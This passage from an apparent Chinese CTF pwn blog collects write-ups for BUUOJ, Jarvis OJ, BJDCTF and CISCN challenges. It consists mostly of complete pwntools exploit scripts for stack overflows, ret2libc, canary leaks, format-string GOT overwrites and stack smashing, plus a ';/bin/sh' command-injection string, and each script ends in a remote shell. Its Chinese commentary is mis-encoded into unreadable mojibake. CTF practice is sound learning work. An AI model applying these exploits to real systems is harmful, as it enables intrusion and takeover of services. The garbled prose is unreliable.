0x28;jmp esp')payload = flat([shellcode, padding, b'b' * 4, jmp_esp, sub_esp_jmp])io.recvuntil(&quot;What's your name?\\n&quot;)io.sendline(payload)io.interactive() åœ¨IDAä¸­å¯ä»¥å‘ç°æˆ‘ä»¬å¯ä»¥åˆ©ç”¨çš„æº¢å‡ºé•¿åº¦å¾ˆçŸ­ï¼Œæ‰€ä»¥æˆ‘ä»¬å¾ˆéš¾æ‰¾åˆ°ä¸€äº›ROPchainï¼Œæ ¹æ®wikiä¸Šçš„æ€è·¯å°±æ˜¯ åœ¨æ ˆä¸Šå¸ƒç½®shellcode æ“æ§eipæŒ‡å‘shellcodeå¤„ å†å°±æ˜¯payloadæœ€åä¸€æ®µçš„è®¾ç½®esp len(shellcode+padding) = 0x20 len(ebp) = 4 len(jmp_esp) = 4 æ‰€ä»¥å°±æ˜¯sub esp,0x28jmp esp æ‰¾shellcodeçš„ç½‘ç«™æ‰¾å°½é‡çŸ­çš„ http://shell-storm.org/shellcode/files/shellcode-575.php TO DOâ€¦","link":"/2021/12/06/rop/"},{"title":"PWNåˆ·é¢˜è®°å½•","text":"å¹³æ—¶åšé¢˜çš„ä¸€ç‚¹è®°å½•ï¼Œå„ä¸ªå¹³å°çš„éƒ½æœ‰ï¼Œéš¾åº¦ä¹Ÿæ˜¯éšæœºçš„ï¼Œæœ‰äº›ä¼šè¯¦ç»†å†™ï¼Œæœ‰äº›ä¼šç•¥è¿‡ï¼Œæ…¢æ…¢æ›´æ–°(ğŸ‘´æ˜¯æ‡’ç‹— [TOC] level0ç®€å•æ ˆæº¢å‡º from pwn import *#io = process('./level0')io = remote('node4.buuoj.cn',25474)payload = b'a'*0x88system = 0x0000000000400596payload += p64(system)io.recvuntil(&quot;Hello, World\\n&quot;)io.sendline(payload)io.interactive() level1æ ¹æ®æ³„æ¼çš„bufåœ°å€ret2shellcode from pwn import *io = remote('node4.buuoj.cn',27234)#io = process('./level1')io.recvuntil(&quot;What's this:&quot;)buf_addr = int(io.recv(10),16)sc = (asm(shellcraft.sh()))payload = sc + (0x88-len(sc))*b'a' + b'bbbb' +p32(buf_addr)io.sendline(payload)io.interactive() level2å¼€äº†NXä¿æŠ¤ï¼Œæ— æ³•å†å†™å…¥shellcodeï¼ŒIDAå¯ä»¥çœ‹åˆ°è°ƒç”¨systemå‡½æ•°ï¼Œæˆ‘ä»¬å¯ä»¥è¿›è¡Œret2lib from pwn import *io = remote('node4.buuoj.cn',28221)elf = ELF('./level2')system = elf.symbols['system']sh = 0x804a029 #gdb search shpayload = b'a'*0x8C + p32(system) + p32(0xdeadbeef) + p32(sh)io.sendline(payload)io.interactive() level3ret2libçš„é¢˜å‹ é¦–å…ˆvulnerable_functionä¸­readå‡½æ•°å­˜åœ¨æº¢å‡ºï¼Œæ¥ç€æ§åˆ¶ç¨‹åºæµç¨‹ï¼Œæ„é€ å‡½æ•°è°ƒç”¨æ ˆ ç„¶ååˆ©ç”¨writeæ³„æ¼å‡ºå…¶åœ°å€ï¼Œæ ¹æ®åç§»ç®—å‡ºlib_base ç„¶åé…åˆé¢˜ç›®æä¾›çš„ libc æ–‡ä»¶è®¡ç®— system() å‡½æ•°çš„åœ°å€ä»¥åŠ /bin/sh çš„åœ°å€ å†åˆ©ç”¨readçš„æ ˆæº¢å‡ºget shell from elftools.construct.macros import UBInt32from pwn import *from six import uio = remote('pwn2.jarvisoj.com',9879)libc = ELF('./libc-2.19.so')elf = ELF('./level3')#æ³„æ¼writeå‡½æ•°åœ°å€write_plt = elf.plt['write']write_got = elf.got['write']vul_addr = elf.symbols['vulnerable_function']payload0 = b'a' * (0x8C) + p32(write_plt) + p32(vul_addr) + p32(0x1) + p32(write_got) + p32(0x4)io.recvuntil(&quot;Input:\\n&quot;)io.sendline(payload0)write_addr = u32(io.recv(4))lib_base = write_addr - libc.symbols['write']system_addr = lib_base + libc.symbols['system']print(hex(system_addr))bin_sh = lib_base + next(libc.search(b'/bin/sh'))payload = b'a' * 0x8C + p32(system_addr) + p32(0xdeadbeef) + p32(bin_sh)io.recvuntil(&quot;Input:\\n&quot;)io.sendline(payload)io.interactive() è¿™é¢˜è‹¥æ²¡ç»™libcæ–‡ä»¶ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥ç”¨DynELFæ¥åš from pwn import *io = remote('pwn2.jarvisoj.com',9879)elf = ELF('./level4')write_plt = elf.symbols['write']write_got = elf.got['write']start = elf.symbols['_start']#å¾ªç¯æ³„æ¼åœ°å€æ—¶ï¼Œæœ€å¥½è¿”å›è·³è½¬åˆ°startä½ç½®vul_addr = elf.symbols['vulnerable_function']read_plt = elf.symbols['read']bss_addr = elf.bss()def leak(address): payload0 = b'a' * (0x8C) + p32(write_plt) + p32(start) + p32(1) + p32(address) + p32(4) io.recvuntil(&quot;Input:\\n&quot;) io.sendline(payload0) data = io.recv(4) return datad = DynELF(leak, elf=ELF('./level3'))system_addr = d.lookup('system','libc')payload1 = b'a' * 0x8C + p32(read_plt) + p32(vul_addr) + p32(0x0) + p32(bss_addr) + p32(0x8)io.sendline(payload1)io.send('/bin/sh\\x00')payload2 = b'a' * 0x8C + p32(system_addr) + p32(0) + p32(bss_addr)io.sendline(payload2)io.interactive() è‹¥python3ç¯å¢ƒæŠ¥é”™çš„è¯ï¼Œæ”¹dynelf.pyæ–‡ä»¶çš„582è¡Œä¸ºè¿™ä¸ª result = e.symbols[symb.decode()] level4å…¶å®level4å°±æ˜¯æ²¡ç»™libçš„level3é‚£ä¸ªè·³è½¬å‡½æ•°çš„ä½ç½®æœ€å¥½å†™startï¼Œç¨‹åºå¼€å§‹çš„ä½ç½®ï¼Œç½‘ä¸Šå¾ˆå¤šwpç”¨çš„æ˜¯vulé‚£ä¸ªå‡½æ•°ï¼Œä½†æ˜¯æˆ‘è¿™é‡Œä¸€ç›´æ‰“ä¸é€šï¼Œç”¨startå°±å¯ä»¥ã€‚ from pwn import *io = remote('pwn2.jarvisoj.com',9880)elf = ELF('./level4')write_plt = elf.symbols['write']write_got = elf.got['write']start = elf.symbols['_start']#å¾ªç¯æ³„æ¼åœ°å€æ—¶ï¼Œæœ€å¥½è¿”å›è·³è½¬åˆ°startä½ç½®vul_addr = elf.symbols['vulnerable_function']read_plt = elf.symbols['read']bss_addr = elf.bss()def leak(address): payload0 = b'a' * (0x8C) + p32(write_plt) + p32(start) + p32(1) + p32(address) + p32(4) #io.recvuntil(&quot;Input:\\n&quot;) io.sendline(payload0) data = io.recv(4) return datad = DynELF(leak, elf=ELF('./level4'))system_addr = d.lookup('system','libc')payload1 = b'a' * 0x8C + p32(read_plt) + p32(vul_addr) + p32(0x0) + p32(bss_addr) + p32(0x8)io.sendline(payload1)io.send('/bin/sh\\x00')payload2 = b'a' * 0x8C + p32(system_addr) + p32(0) + p32(bss_addr)io.sendline(payload2)io.interactive() æ³¨æ„æŠŠrecv(â€œinputâ€)å»æ‰å°±å¥½äº† jarvisoj_tell_me_somethingåœ¨readå‡½æ•°å¤„æœ‰æ˜æ˜¾çš„æ ˆæº¢å‡ºï¼Œç”¨gdbå¯ä»¥ç®—å‡ºåç§»æ˜¯136ï¼Œç„¶åidaå‘ç°æœ‰ä¸ªgood_gameå‡½æ•°ï¼ŒF5åå‘ç°é‡Œé¢ä¼šè¯»å‡ºflag.txtï¼Œä½†æ˜¯mainå‡½æ•°ä¸­æ²¡æœ‰è°ƒç”¨ï¼Œæ‰€ä»¥æˆ‘ä»¬åˆ©ç”¨æ ˆæº¢å‡ºè¦†ç›–åˆ°good_gameçš„åœ°å€ exp from pwn import *context.log_level = 'debug'name = './guest'#io = process(name)io = remote('node4.buuoj.cn',27744)elf = ELF('./guest')padding = b'a' * 0x88good_game = elf.symbols['good_game']payload = padding + p64(good_game)io.recvuntil(&quot;Input your message:\\n&quot;)io.sendline(payload)io.interactive() Level2_x64è¿™é¢˜å’Œä¹‹å‰çš„x86å·®ä¸å¤šï¼Œå°±æ˜¯è¦æ”¹ä¼ å‚çš„æ–¹å¼ exp from pwn import *io = remote('pwn2.jarvisoj.com', 9882)elf = ELF('./level2_x64')system = elf.symbols['system']bin_sh = next(elf.search(b'/bin/sh'))pop_rdi_ret = 0x00000000004006b3payload = b'a' * 0x88 + p64(pop_rdi_ret) + p64(bin_sh) + p64(system) + p64(0xdeadbeef)io.recvuntil('Input:\\n')io.sendline(payload)io.interactive() Level3_x64è¿™é¢˜æ€è·¯ä¹Ÿæ˜¯ä¸x86çš„ç›¸åŒï¼Œåªæ˜¯ä¼ å‚è°ƒç”¨çš„æ–¹å¼å˜äº†ï¼Œè¦è®¾ç½®å¯„å­˜å™¨ä»¥åŠä»å·¦åˆ°å³ä¼ å‚ expå¦‚ä¸‹ from pwn import *io = remote('pwn2.jarvisoj.com',9883)elf = ELF('./level3_x64')lib = ELF('./libc-2.19.so')write_plt = elf.symbols['write']write_got = elf.got['write']start = elf.symbols['_start']pop_rdi_ret = 0x00000000004006b3pop_rdi_r15_ret = 0x00000000004006b1vul_addr = elf.symbols['vulnerable_function']payload = b'a' * 0x88payload += p64(pop_rdi_ret) + p64(1)payload += p64(pop_rdi_r15_ret) + p64(write_got) + p64(0xdeadbeef)payload += p64(write_plt) + p64(start)io.recvuntil(&quot;Input:\\n&quot;)io.sendline(payload)write_addr = u64(io.recv(8))lib_base = write_addr - lib.symbols['write']system = lib_base + lib.symbols['system']bin_sh = lib_base + next(lib.search(b'/bin/sh'))payload2 = b'a' * 0x88 + p64(pop_rdi_ret) + p64(bin_sh) + p64(system)io.recvuntil(&quot;Input:\\n&quot;)io.sendline(payload2)io.interactive() xdctf2015_pwn200ret2libcé¢˜å‹ï¼Œæ— libc.so,åˆ©ç”¨DynELF exp from pwn import *#context.log_level = 'debug'name = './bof'#p = process(name)p = remote('node4.buuoj.cn',25758)elf = ELF(name)write_plt = elf.plt['write']start = elf.symbols['_start']read_plt = elf.plt['read']vul_addr = elf.symbols['vuln']bss = elf.bss()padding = b'a' * 112def leak(address): payload = flat([padding,write_plt,start,1,address,4]) p.recvuntil(&quot;~!\\n&quot;) p.send(payload) data = p.recv(4) return datad = DynELF(leak, elf=ELF('./bof'))system = d.lookup('system', 'libc')payload1 = flat([padding, read_plt, vul_addr, 0, bss, 8])p.sendline(payload1)p.send('/bin/sh\\x00')payload2 = flat([padding, system, 0xdeadbeef, bss])p.sendline(payload2)p.interactive() [BJDCTF 2020]babystackå¦‚é¢˜babyï¼ŒåŸºç¡€çš„ret2text from pwn import *elf = ELF('ret2text')p=remote('1.14.71.254',28098)backdoor = elf.symbols['backdoor']p.sendline('100')payload = b'a' * 24 + p64(backdoor)p.sendline(payload)p.interactive() [BJDCTF 2020]babyropè¿™é¢˜æ€è·¯æ²¡ä»€ä¹ˆå¥½è¯´çš„ï¼Œå°±æ˜¯64ä½çš„æ— libc.soçš„ret2libcï¼Œåˆ©ç”¨LibcSearchåšå¥½ä¼ å‚é¡ºåºï¼Œæˆ‘è¯´è¯´æˆ‘é‡åˆ°çš„å‡ ä¸ªç‚¹ï¼ˆå¤§ä½¬å‹¿å–· æœ€ä¸»è¦çš„æ˜¯ï¼Œæˆ‘å¼€å§‹æ˜¯ç”¨flat([ ])æ„é€ payloadï¼Œä¸€ç›´æ²¡æ‰“é€šï¼ŒæŠ˜ç£¨æˆ‘å¥½ä¹…ã€‚ã€‚ã€‚ è¿˜æœ‰å°±æ˜¯LibcSearchä¼šè¦ä½ è‡ªå·±å»é€‰æ‹©å‡ ä¸ªlibc.soï¼Œè¿™ä¸ªå¤šæ‰“å‡ æ¬¡å°±å¥½äº† from pwn import *from LibcSearcher import *io = remote('1.14.71.254',28054)context.log_level = 'debug'#io = process('./pwn')elf = ELF('./pwn')put_plt = elf.plt['puts']puts_got = elf.got['puts']start = elf.symbols['_start']padding = b'a' * 0x28pop_rdi_ret = 0x0400733payload1 = padding + p64(pop_rdi_ret) + p64(puts_got) + p64(put_plt) + p64(start)io.sendafter('story!',payload1)io.recv() #è¿™é‡Œè¦æ¥å—ä¸€ä¸ªæ•°æ®ï¼Œä¸ç„¶ä¼šé”™puts_addr = u64(io.recv(6).ljust(8,b'\\x00')) #[DEBUG] Received 0x6 bytes:print(hex(puts_addr))libc = LibcSearcher('puts', puts_addr)lib_base = puts_addr - libc.dump('puts')print(hex(lib_base))system_addr = lib_base + libc.dump('system')print(hex(system_addr))bin_sh = lib_base + libc.dump('str_bin_sh')print(hex(bin_sh))payload2 = padding + p64(pop_rdi_ret) + p64(bin_sh) + p64(system_addr)io.sendafter(&quot;story!&quot;,payload2)io.interactive() [BJDCTF 2020]babystack2.0é¢˜ç›®æ¯”1.0å¤šäº†ä¸€ä¸ªåˆ¤æ–­ï¼Œæ¯”è¾ƒnbyteså’Œ10çš„å¤§å°ï¼Œåœ¨æ¯”è¾ƒæ—¶æ˜¯signed int,ä½†æ˜¯åœ¨readè¾“å…¥æ—¶æ˜¯unsigned int åˆ©ç”¨ç¬¦å·æº¢å‡ºï¼Œè¾“å…¥è´Ÿæ•°-1ç»•è¿‡åˆ¤æ–­ï¼Œè¿›å…¥nameè¿›è¡Œæ ˆæº¢å‡º from pwn import *io = remote('1.14.71.254',28031)backdoor = 0x0400726payload = b'a' * 0x18 + p64(backdoor)io.sendlineafter('name:','-1')io.sendlineafter('name?',payload)io.interactive() [BJDCTF 2020]babyrouterå‘½ä»¤æ‰§è¡Œç»•è¿‡ case 1 : puts(&quot;Please input the ip address:&quot;); read(0,ip,16); strcat(command,ip); system(command); puts(&quot;done!&quot;); break; æ„é€  ;/bin/sh [Jarvis OJ]fmæ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼Œåˆšå­¦åˆ°è¿™ä¸€å—ï¼Œçœ‹å¾—æœ‰ç‚¹è¿·ç³Šï¼Œåšåšé¢˜ç†è§£ä¸‹ è¿™é¢˜é€»è¾‘æŒºç®€å•ï¼Œxåˆå§‹åŒ–ä¸º3ï¼Œå½“ä¿®æ”¹x=4æ—¶å°±å¯ä»¥è¯»å‡ºflagï¼Œæ‰€ä»¥æˆ‘ä»¬å°±è¦åˆ©ç”¨format stringå°†xå¯¹åº”å†…å­˜åœ°å€å¤„çš„å€¼æ”¹ä¸º4 ç„¶ååç§»çš„è¯ï¼Œåˆ©ç”¨pwngdbçš„æ’ä»¶fmtargç®—å‡ºæ˜¯11 printf(x_address+&quot;%c$n&quot;)å¯ä»¥ä¿®æ”¹[x_address]çš„å€¼ä¸ºx_addressçš„å­—ç¬¦é•¿åº¦è¿™é‡Œå¾ˆå·§çš„ä¸€ç‚¹å°±æ˜¯p32(x_addr)çš„é•¿åº¦åˆšå¥½æ˜¯4ä¸ªå­—èŠ‚ exp from pwn import *io = remote('pwn2.jarvisoj.com' ,9895)x_addr = 0x0804A02Cpayload = p32(x_addr) + b&quot;%11$n&quot;io.sendline(payload)io.interactive() inndy_echoåŒæ ·æ˜¯format string å¯¼å…¥IDAä¸­å¯ä»¥çœ‹åˆ° do { fgets(&amp;s, 256, stdin); printf(&amp;s); } while ( strcmp(&amp;s, &quot;exit\\n&quot;) ); system(&quot;echo Goodbye&quot;); åœ¨printfå¤„å¯ä»¥åˆ©ç”¨ï¼Œå…ˆåœ¨gdbä¸­ç®—å‡ºåç§»æ˜¯7ï¼Œç„¶åæˆ‘ä»¬çœ‹åˆ°æœ‰systemå‡½æ•°ï¼Œæˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨GOT hiJackå°†printf@gotçš„å†…å®¹æ”¹å†™æˆsystem@pltçš„åœ°å€,å†å†™å…¥/bin/sh\\x00æ‰§è¡Œ from pwn import *elf = ELF('echo')#io = process('./echo')io = remote('node4.buuoj.cn',26569)#context.terminal = ['tmux','splitw','-h']printf_got = elf.got['printf']system_plt = elf.plt['system']payload = fmtstr_payload(7,{printf_got:system_plt})io.sendline(payload)io.send('/bin/sh\\x00')io.interactive() [NSSæ–°ç”Ÿèµ›]whitegive_pwn64ä½çš„æ— libcçš„ropï¼Œæ³„æ¼å‡ºputs çš„åœ°å€ï¼Œåˆ©ç”¨LibSearchç®—å‡ºåŸºåœ°å€ï¼Œå¾—åˆ°systemå’Œbin/shçš„åœ°å€ï¼Œä¼ å‚æ‰§è¡Œå°±å¥½äº† exp from pwn import *from LibcSearcher import *io = remote('1.14.71.254',28035)elf = ELF('./bgei')pop_rdi_ret = 0x0000000000400763puts_plt = elf.plt['puts']puts_got = elf.got['puts']main = elf.symbols['main']payload1 = b'a' * 24 + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main)io.sendline(payload1)puts_addr = u64(io.recv(6).ljust(8,b'\\x00'))print(hex(puts_addr))libc = LibcSearcher('puts', puts_addr)libc_base = puts_addr - libc.dump('puts')system = libc_base + libc.dump('system')bin_sh = libc_base + libc.dump('str_bin_sh')payload2 = b'a' * 24 + p64(pop_rdi_ret) + p64(bin_sh) + p64(system)io.sendline(payload2)io.interactive() [BJDCTF 2020]babyrop2è¿™é¢˜ä¸»è¦è€ƒç‚¹å°±æ˜¯æ ¼å¼åŒ–å­—ç¬¦ä¸²leakå‡ºcanaryï¼Œç„¶ååˆ©ç”¨ROPå’ŒLibSearchæ‰¾åˆ°libcï¼Œæœ€ågetshell ç”¨IDAæ‰“å¼€ä¸»è¦çœ‹vulnå’Œgiftå‡½æ•°ï¼Œé¦–å…ˆçœ‹gift char format; // [rsp+0h] [rbp-10h] unsigned __int64 v2; // [rsp+8h] [rbp-8h] v2 = __readfsqword(0x28u); puts(&quot;I'll give u some gift to help u!&quot;); __isoc99_scanf(&quot;%6s&quot;, &amp;format); printf(&amp;format); puts(byte_400A05); fflush(0LL); return __readfsqword(40u) ^ v2; å¯ä»¥çœ‹åˆ°æœ€å¤§è¾“å…¥6ä¸ªå­—ç¬¦ï¼Œæˆ‘ä»¬å°è¯•è¾“å…¥ I'll give u some gift to help u!%6$p 0x7f0070243625Pull up your sword and tell me u story! å‘ç°printfæ˜¯å­˜åœ¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´çš„ï¼Œæˆ‘ä»¬åœ¨gdbä¸­æµ‹è¯•åç§» å¯ä»¥çœ‹åˆ°ï¼Œæˆ‘ä»¬è¾“å…¥çš„æ³„æ¼åç§»æ˜¯6ï¼Œè¯´æ˜æ ¼å¼åŒ–å­—ç¬¦ä¸²çš„åç§»æ˜¯6ï¼Œè€Œä¸‹é¢ä¹Ÿå°±æ˜¯canaryçš„å€¼ï¼ˆä»¥00ç»“å°¾ï¼‰ï¼Œåœ¨IDAä¸­ä¹Ÿå¯ä»¥çœ‹åˆ°canryåœ¨RSP+8çš„ä½ç½®ï¼Œæ‰€ä»¥æ³„æ¼canaryçš„åç§»ä¸º7ï¼Œè¿™é‡Œå…¶å®æ‰¾åé¢æ£€æŸ¥æ—¶çš„canaryä¹ŸğŸ‰‘ï¸ï¼Œåç§»å°±æ˜¯11 è¿™é‡Œé‡åˆ°çš„å‡ ä¸ªç‚¹ åœ¨æ‰“expçš„æ—¶å€™ï¼Œä¼šå‘ç°æœ‰æ—¶å€™recvæ¥æ”¶çš„é—®é¢˜ï¼Œè¿™ä¸ªè¿˜å¾—å¤šçœ‹çœ‹è¯­æ³•å’Œå…·ä½“é¢˜ç›®åˆ†æï¼Œä¸ç„¶æ‰“ä¸é€š pythonçš„ä¸€äº›ç±»å‹è½¬æ¢çš„é—®é¢˜ä¼šæŠ¥é”™ï¼Œå¤šè¯•è¯•ç½‘ä¸Šçš„å„ç§å†™æ³• å¼€å§‹ç”¨mainæ¥æ³„æ¼å‘ç°ä¸€ç›´ä¸é€šï¼Œåæ¥æ”¹vulnå‡½æ•°å°±å¯ä»¥ã€‚ã€‚æˆ‘è§‰å¾—æ˜¯å› ä¸ºæ ˆæº¢å‡ºæ˜¯å‘ç”Ÿåœ¨vulnä¸­ï¼Œè€Œmainçš„è¯æ˜¯è°ƒç”¨ï¼Œå¯èƒ½æ‰“çš„æ—¶å€™å‡ºäº†äº›é—®é¢˜ exp from pwn import *from LibcSearcher import *io = remote('1.14.71.254',28083)context.log_level = 'debug'elf = ELF('./bjd_rop2')payload = b&quot;%7$p&quot;io.sendlineafter('u!',payload)#io.recvuntil(&quot;0x&quot;)io.recv()canary = io.recvuntil('\\n')[:-1]#canary = int(io.recv(16),16)pop_rdi_ret = 0x0000000000400993puts_plt = elf.plt['puts']puts_got = elf.got['puts']vuln = elf.symbols['vuln']payload2 = b'a' * (0x20 - 0x8) + p64(int(canary.decode(),16)) + b'a' * 0x8payload2 += p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(vuln)io.recvuntil('Pull up your sword and tell me u story!')io.sendline(payload2)#puts_addr = u64(io.recv(6).ljust(8,b'\\x00'))puts_addr = u64(io.recvuntil(&quot;\\x7f&quot;)[-6:].ljust(8,b'\\x00'))log.info(hex(puts_addr))libc = LibcSearcher('puts',puts_addr)libc_base = puts_addr - libc.dump('puts')system = libc_base + libc.dump('system')bin_sh = libc_base + libc.dump('str_bin_sh')payload3 = b'a' * (0x20 - 0x8) + p64(int(canary.decode(),16)) + b'a' * 0x8 + p64(pop_rdi_ret) + p64(bin_sh) + p64(system)io.sendlineafter(&quot;story!&quot;,payload3)io.interactive() smashes â€“ stack smashä¸»è¦å‚è€ƒ hollkå¸ˆå‚…çš„åˆ†æ åŸç†å¦‚ä¸‹ æ ¸å¿ƒå°±æ˜¯åˆ©ç”¨æ ˆæº¢å‡ºè¦†ç›–__libc_argv[0]ä¸ºæˆ‘ä»¬æƒ³è¦æ³„æ¼çš„ä¿¡æ¯çš„åœ°å€ exp,ä¸»è¦è·Ÿç€æ–‡ç« å»åˆ†æ from pwn import *io = remote('pwn.jarvisoj.com',9877)#io = process('./smashes')padding = 0x7fffffffe418 - 0x7fffffffe200payload = b'a' * padding + p64(0x400d20)io.sendafter('name?', payload)io.interactive() [CISCN 2019ååŒ—]PWN164ä½çš„åªå¼€äº†nxä¿æŠ¤ï¼Œå¯¼å…¥idaä¸­åˆ†æï¼Œå¯ä»¥çœ‹åˆ°åªè¦v2å˜é‡å€¼ä¸º11.28125å°±èƒ½cat /flagï¼Œå¹¶ä¸”åœ¨getsè¾“å…¥v1ä¸­å­˜åœ¨æ ˆæº¢å‡ºï¼Œåœ¨IDAä¸­çœ‹åˆ°åªè¦è¦†ç›–(0x30 - 0x4)å°±å¯ä»¥ç›–åˆ°v2 è¿™é‡Œæˆ‘ä»¬ä¼ è¾“çš„æ—¶å€™è¦æŠŠ11.28125è½¬æ¢æˆ16è¿›åˆ¶0x41348000 exp from pwn import *io = remote('1.14.71.254', 28093)cat_flag = 0x41348000payload = b'a' * (0x30 - 0x4) + p64(cat_flag)io.sendlineafter(&quot;Let's guess the number.&quot;, payload)io.interactive() [2021 é¹¤åŸæ¯]babyofåœ¨IDAä¸­çœ‹åˆ°bufå¤„å­˜åœ¨æ ˆæº¢å‡ºï¼Œç†Ÿæ‚‰çš„ret2libc è¿™é‡Œè¦æ³¨æ„æœ€åæ‰“payloadçš„æ—¶å€™è¦åŠ ä¸ªretå¯¹é½ï¼Œä¸ç„¶æ‰“ä¸é€š from pwn import *from LibcSearcher import *io = remote('1.14.71.254', 28081)elf = ELF('./babyof')pop_rdi_ret = 0x0000000000400743ret = 0x0000000000400506put_plt = elf.plt['puts']put_got = elf.got['puts']main = 0x000000000040066Bpayload1 = b'a' * 0x40 + b'a' * 8 + p64(pop_rdi_ret) + p64(put_got) + p64(put_plt) + p64(main)io.recvuntil(&quot;Do you know how to do buffer overflow?&quot;)io.sendline(payload1)puts_addr = u64(io.recvuntil(&quot;\\x7f&quot;)[-6:].ljust(8,b'\\x00'))log.info(hex(puts_addr))libc = LibcSearcher('puts', puts_addr)libc_base = puts_addr - libc.dump('puts')system = libc_base + libc.dump('system')bin_sh = libc_base + libc.dump('str_bin_sh')payload2 = b'a' * 0x40 + b'a' * 0x8 + p64(ret) + p64(pop_rdi_ret) + p64(bin_sh) + p64(system)io.sendlineafter(&quot;Do you know how to do buffer overflow?&quot;, payload2)io.interactive() [2021 é¹¤åŸæ¯]littleofè¿™ä¸€é¢˜å°±æ˜¯ä¸Šä¸€é¢˜çš„å‡çº§ç‰ˆï¼Œå¼€å¯äº†canaryä¿æŠ¤ï¼Œä¸è¿‡æˆ‘ä»¬è§‚å¯ŸIDAåˆ†æå¯ä»¥å‘ç°ï¼Œç¬¬ä¸€æ¬¡printfè¾“å‡ºå¯ä»¥leakå‡ºcanaryçš„å€¼ï¼Œæœ‰äº†canaryå°±å¯ä»¥ret2libc exp from pwn import *from LibcSearcher import *#io = process('./littleof')io = remote('1.14.71.254', 28031)elf = ELF('./littleof')put_plt = elf.plt['puts']put_got = elf.got['puts']pop_rdi_ret = 0x0000000000400863ret = 0x000000000040059emain = 0x0000000000400789payload = b'a' * (0x50 - 0x8)io.recvuntil(&quot;Do you know how to do buffer overflow?&quot;)io.sendline(payload)io.recvuntil(&quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\\n&quot;)canary = u64(io.recv(7).rjust(8, b'\\x00'))print(&quot;canary:&quot;,hex(canary))payload1 = b'a' * (0x50 - 0x8) + p64(canary) + b'a' * 0x8 + p64(pop_rdi_ret) + p64(put_got) + p64(put_plt) + p64(main)io.sendlineafter(&quot;Try harder!&quot;, payload1)puts_addr = u64(io.recvuntil(&quot;\\x7f&quot;)[-6:].ljust(8,b'\\x00'))libc = LibcSearcher('puts', puts_addr)libc_base = puts_addr - libc.dump('puts')system = libc_base + libc.dump('system')bin_sh = libc_base + libc.dump('str_bin_sh')payload = b'a' * (0x50 - 0x8)io.recvuntil(&quot;Do you know how to do buffer overflow?&quot;)io.sendline(payload)io.recvuntil(&quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\\n&quot;)canary = u64(io.recv(7).rjust(8, b'\\x00'))payload2 = b'a' * (0x50 - 0x8) + p64(canary) + b'a' * 0x8 + p64(ret) + p64(pop_rdi_ret) + p64(bin_sh) + p64(system)io.sendlineafter(&quot;Try harder!&quot;, payload2)io.interactive() [2021 é¹¤åŸæ¯]easyechoç»å…¸çš„stack smashé¢˜ç›®ï¼Œä¿æŠ¤å…¨å¼€ã€‚ã€‚ã€‚å¯¼å…¥IDAä¸­è§‚å¯Ÿ è¿™ä¸ªå¾ªç¯åªè¦è¾“å…¥backdoorå°±èƒ½ç»•è¿‡ï¼Œä½†æ˜¯æˆ‘ä»¬æ— æ³•æ‰¾åˆ°flagçš„åœ°å€ï¼Œè¿™å°±è¦åˆ©ç”¨åˆ°ä¸Šé¢Nameå¤„leakå‡ºæ ˆä¸Šçš„åœ°å€ï¼Œåœ¨v8å¤„ï¼Œè¯»å…¥16ä¸ªa åŒæ—¶æˆ‘ä»¬è§‚å¯Ÿåˆ°ç¨‹åºpieåŸºå€ æ‰€ä»¥æˆ‘ä»¬å°±èƒ½å¾—åˆ°flagçš„ä½ç½®è®¡ç®—flag = pie_base + offset ç»§ç»­è§‚å¯ŸIDAï¼Œè·Ÿè¿›read_flagå‡½æ•°å¯ä»¥å‘ç° å¯ä»¥å°†flagè¾“å‡ºåˆ°bssæ®µæ‰“å°å‡ºæ¥ï¼Œæ¥ä¸‹æ¥å°±æ˜¯æ‰¾æˆ‘ä»¬çš„padding è§‚å¯Ÿæ ˆå˜é‡ï¼Œçœ‹åˆ°v8å’Œv10å·®äº†0x20 å› ä¸ºæœ‰getsï¼Œæˆ‘ä»¬åœ¨v10å¤„æ ˆæº¢å‡ºï¼Œé€šè¿‡stack smashè¾“å‡ºflag äºæ˜¯padding = 0x7fffffffe418 - 0x7fffffffe2b0 exp from pwn import *io = remote('1.14.71.254',28013)#io = process('./easyecho')io.sendafter(&quot;Name:&quot;, b'a'*16)io.recvuntil(&quot;Welcome aaaaaaaaaaaaaaaa&quot;)leak_addr = u64(io.recv(6).ljust(8, b'\\x00'))pie_base = leak_addr - 0xcf0open_flag = pie_base + 0x0000000000202040io.recvuntil(&quot;Input: &quot;)io.sendline(&quot;backdoor&quot;)argv0 = 0x7fffffffe418v10 = 0x7fffffffe2b0padding1 = b'a' * (argv0 - v10)payload = padding1 + p64(open_flag)io.sendlineafter(&quot;Input: &quot;, payload)io.recvuntil(&quot;Input: &quot;)io.sendline(&quot;exitexit&quot;)io.interactive() [CISCN 2019ä¸œåŒ—]PWN2åªå¼€äº†NXä¿æŠ¤ï¼Œå¯¼å…¥IDAä¸­åˆ†æ åªæœ‰åœ¨encrptå‡½æ•°é‡Œæœ‰åˆ©ç”¨ç‚¹ï¼Œå¼€äº†NXï¼Œæ²¡æœ‰canaryï¼Œæ²¡æœ‰å¯ä»¥åˆ©ç”¨çš„å‡½æ•°ï¼Œè‡ªç„¶çš„ret2libcæ”»å‡» exp from pwn import *from LibcSearcher import *io = remote('1.14.71.254', 28096)#io = process('./ciscn_2019db_pwn2')elf = ELF('./ciscn_2019db_pwn2')context.log_level = 'debug'puts_plt = elf.plt['puts']puts_got = elf.got['puts']start = elf.symbols['_start']pop_rdi_ret = 0x0000000000400c83ret = 0x00000000004006b9io.sendlineafter(&quot;choice!\\n&quot;, '1')padding = b'a' * 0x50 + b'b' * 0x8payload = padding + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(start)io.sendlineafter(&quot;encrypted\\n&quot;, payload)puts_addr = u64(io.recvuntil(&quot;\\x7f&quot;)[-6:].ljust(8,b'\\x00'))log.info(hex(puts_addr))libc = LibcSearcher('puts', puts_addr)libc_base = puts_addr - libc.dump('puts')system = libc_base + libc.dump('system')bin_sh = libc_base + 